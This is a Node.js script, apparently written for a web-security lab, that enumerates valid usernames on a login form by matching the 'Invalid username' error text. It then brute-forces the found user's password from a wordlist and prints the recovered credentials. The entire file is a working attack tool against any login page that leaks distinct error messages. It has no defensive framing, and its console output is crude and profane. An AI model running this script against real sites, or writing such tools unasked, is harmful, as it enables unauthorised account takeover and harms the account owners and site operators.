const fs= require('fs')
const rl=require('readline/promises').createInterface({
  input: process.stdin,
  output: process.stdout
})

const data= fs.readFileSync('./username_wordlists.txt', 'utf8').split('\n').map(name=>name.trim())
const pass=fs.readFileSync('./password_wordlist.txt', 'utf8').split('\n').map(pass=>pass.trim())
async function url(){
const targetUrl= await rl.question('paste the targets url: ')
return targetUrl
}

async function cookie(){
const session_cookie=await rl.question('paste your session cookie:')
return session_cookie
}

async function authentication(data, targetUrl, session_cookie){

    for(const username of data){
    try{
        const response=await fetch(targetUrl,{
    method: 'POST',
    headers:{'content-type':'application/x-www-form-urlencoded',
    'cookie':`session=${session_cookie}`
    },
    body:`username=${username}&password=randmnessword`
    })
    
 const  responseText= await response.text()

if(responseText.includes('Invalid username')){
    console.log(`username: ${username} does not exist`)
}else{
    let confirmedtarget=username
    console.log(`username: ${username} exists, starting the password check......lets fuckin gooo \n \n || \n || \n  V \n`)
await password(confirmedtarget, targetUrl, session_cookie)
process.exit(0)
}
}catch(e){console.log(`something wrong happened:${e.message}`)}


        }
}
 async function password(targetUser, targetUrl, session_cookie){
    
            for(const password of pass){
        try{
            const response= await fetch(targetUrl, {
                method:"POST",
               
                headers:{"content-type":"application/x-www-form-urlencoded",
                    'cookie':`session=${session_cookie}`
                },
                body:`username=${targetUser}&password=${password}`
            })

            const  responseText= await response.text()
            if (responseText.includes('Incorrect password')){
                console.log(`${password} aint even fuckin close`)

                }else{
                    console.log(`password for ${targetUser} is ${password} with status: ${response.status}   fuck yeahhh !!!!`)

                    console.log(`you are fuckin in, your credetials are:${targetUser}:${password}`)
                    return;
                }
        }catch(e){console.log(`something wrong happened:${e.message}`)}
            }
        }
async function start() {
    const targetUrl = await url()
    const session_cookie = await cookie()
    rl.close()
    await authentication(data, targetUrl, session_cookie)
}

start()